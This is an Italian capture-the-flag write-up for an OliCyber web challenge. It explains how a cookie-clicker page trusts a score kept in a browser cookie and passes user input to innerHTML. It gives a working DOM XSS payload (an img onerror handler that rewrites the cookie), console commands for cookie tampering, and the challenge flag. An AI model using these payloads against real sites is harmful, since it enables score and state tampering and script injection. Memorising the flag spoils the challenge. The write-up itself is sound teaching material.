# Writeup Challenge: Shark Bait's Cookie Clicker

**Target:** `[http://click-me.challs.olicyber.it/](http://click-me.challs.olicyber.it/)`

**Flag:** `flag{n3v3r_tru5t_c00k1e5}`

**Categoria:** Web Security / DOM XSS & Broken Access Control (Client-Side State)

---

### Obiettivo

Raggiungere la soglia di cookie richiesta (10.000.000) per far sì che il backend validi il valore memorizzato nel cookie HTTP `cookies` e restituisca la flag all'interno dell'elemento `<h1>` al ricaricamento della pagina.

---

### Analisi della Vulnerabilità

1. **Client-Side State Manipulation:**
L'applicazione affida interamente la logica di avanzamento del punteggio al browser client, salvando il valore progressivo nel cookie `document.cookie = "cookies=" + num;`. Poiché il server non mantiene uno stato né valida la provenienza degli incrementi, si fida ciecamente del valore inviato nell'header `Cookie`.
2. **DOM-based Cross-Site Scripting (DOM XSS):**
All'avvio della pagina, il prompt raccoglie l'input utente (`name`) e lo inietta direttamente nel DOM senza sanitizzazione né encoding:

```javascript
space.innerHTML = "Pasticceria da: " + name;

```

L'uso di `.innerHTML` consente l'iniezione di nodi HTML arbitrari. Sebbene i tag `<script>` non vengano eseguiti via `innerHTML` secondo le specifiche HTML5, è possibile attivare l'interprete JavaScript tramite event handler (es. `onerror`, `onload`).

---

### Vettori di Risoluzione

#### Metodo 1: Exploitation via DOM XSS

Iniezione del payload nel `prompt` iniziale tramite tag `<img>` malformato per triggerare l'evento `onerror`:

```html
<img src="x" onerror="document.cookie='cookies=10000000'; location.reload();">

```

* **Esecuzione:** Il browser tenta di caricare la risorsa inesistente `x`, fallisce e scatena l'evento `onerror`, che esegue il codice JS modificando il cookie e ricaricando la pagina.

#### Metodo 2: Cookie Tampering Diretto (Approccio Diretto)

Trattandosi di una vulnerabilità di validazione client-side sul valore del cookie, non era strettamente necessario sfruttare l'XSS:

* **Da Console del browser (F12):**

```javascript
document.cookie = "cookies=10000000";
location.reload();

```

* **Modifica manuale:** Modificando il cookie `cookies` direttamente dal pannello **Application / Storage > Cookies** di DevTools o inviando la richiesta HTTP con header personalizzato (`Cookie: cookies=10000000`).

---

### Risultato

Al refresh, il server riceve la richiesta con `Cookie: cookies=10000000`, valida il superamento della soglia e renderizza la flag nella risposta HTML:

```html
<h1>flag{n3v3r_tru5t_c00k1e5}</h1>

```

questo era il codice html del client:

```html
<html>
    <head>
        <title>Shark Bait's Cookie Clicker Game!</title>
        <link rel="stylesheet" href="index.css"/>
    </head>

    <body>
         <div id="space"></div>
        <div id="cookie" onclick="cookieClick()">
            <img src="https://media.giphy.com/media/l0u0eiVkW4x0Y/200.gif" width="200px"/>
        </div>
        
        <p>Number of Cookies:</p>
        
        <div id = "numbers"></div>
    </body>
    <script>
        var num = 0;

        window.onload = function () {
            var name = prompt("Inserisci il tuo nome");
            var space = document.getElementById("space");
            space.innerHTML = "Pasticceria da: " + name;
        }

        var cookie = document.getElementById("cookie");

        function cookieClick() { 
            num += 1;

            var numbers = document.getElementById("numbers");
            document.cookie = "cookies="+num;

            numbers.innerHTML = num;      
        }
    </script>
</html>
```

## Strumenti Online
I principali strumenti online (browser-based) per comporre, testare e inviare richieste HTTP (GET, POST, PUT, DELETE, con header e body personalizzati):

| Strumento | Tipo | Caratteristiche principali | Link / Accesso |
| --- | --- | --- | --- |
| **Hoppscotch** | Web App open source | Alternativa leggera e completa a Postman; funziona direttamente da browser con supporto a REST, GraphQL e WebSocket. | [hoppscotch.io](https://hoppscotch.io) |
| **ReqBin** | Online API Client | Interfaccia immediata pensata specificamente per testare REST/SOAP e generare snippet di codice (incluso `curl`). | [reqbin.com](https://reqbin.com) |
| **Postman for Web** | Piattaforma completa | Versione browser del noto client API; richiede login e l'estensione/agent locale per superare i blocchi CORS. | [postman.com](https://www.postman.com) |
| **HTTPie Web** | Web App moderna | Interfaccia pulita e minimale con sintassi semplificata e visualizzatore JSON interattivo. | [httpie.io/app](https://httpie.io/app) |
| **Webhook.site** | Endpoint & Client | Ideale per ispezionare le richieste in entrata e per inviare richieste custom verso altri endpoint. | [webhook.site](https://webhook.site) |

---

**Strumenti integrati già disponibili nel browser**

* **DevTools (Console / Fetch):** Puoi inviare qualsiasi richiesta direttamente dalla Console JavaScript del browser (`F12`):

```javascript
fetch("https://httpbin.org/post", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ key: "value" })
}).then(res => res.json()).then(console.log);

```

* **"Copy as cURL" nei DevTools:** Nella scheda **Network** del browser, clicca con il tasto destro su qualsiasi richiesta registrata e seleziona **Copy $\rightarrow$ Copy as cURL** per esportare istantaneamente il comando completo di header e cookie.
